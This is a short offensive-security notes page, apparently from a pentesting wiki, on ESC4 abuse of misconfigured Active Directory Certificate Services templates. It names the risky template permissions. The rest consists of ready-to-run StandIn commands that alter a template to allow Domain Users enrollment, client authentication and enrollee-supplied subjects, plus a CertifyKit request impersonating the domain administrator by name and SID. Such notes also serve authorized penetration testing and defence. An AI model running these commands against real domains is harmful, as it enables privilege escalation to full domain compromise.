---
description: Domain escalation via misconfigured certificate template access control
---

# ESC4

This misconfiguration can occur when unintended users are granted one of the following template security permissions:

* Owner
* WriteOwnerPrincipals
* WriteDaclPrincipals
* WritePropertyPrincipals

#### Adding Certificates with StandIn

To add certificates using StandIn, follow these examples:

*   **Certificate Enrollment Permission**: To allow Domain Users to enroll for certificates, use the following command:

    {% code fullWidth="true" %}
    ```powershell
    StandIn_v13_Net45.exe --ADCS --filter SecureUpdate ntaccount "cb domain users" --enroll --add
    ```
    {% endcode %}
*   **Client Authentication EKU**: To add a certificate with Client Authentication EKU, execute:

    ```powershell
    StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --clientauth --add
    ```

ENROLLEE\_SUPPLIES\_SUBJECT:

```
StandIn_v13_Net45.exe --ADCS --filter SecureUpdate --ess --add
```

An example for SmartCardLogon ESC4 Abuse using CertifyKit’s /alter option is as follows:

{% code fullWidth="true" %}
```
CertifyKit.exe request /ca:cb-ca.cb.corp\CB-CA /template:'SecureUpdate' /altname:administrator
/domain:cb.corp /alter /sidextension:S-1-5-21-2928296033-1822922359-262865665-500
```
{% endcode %}
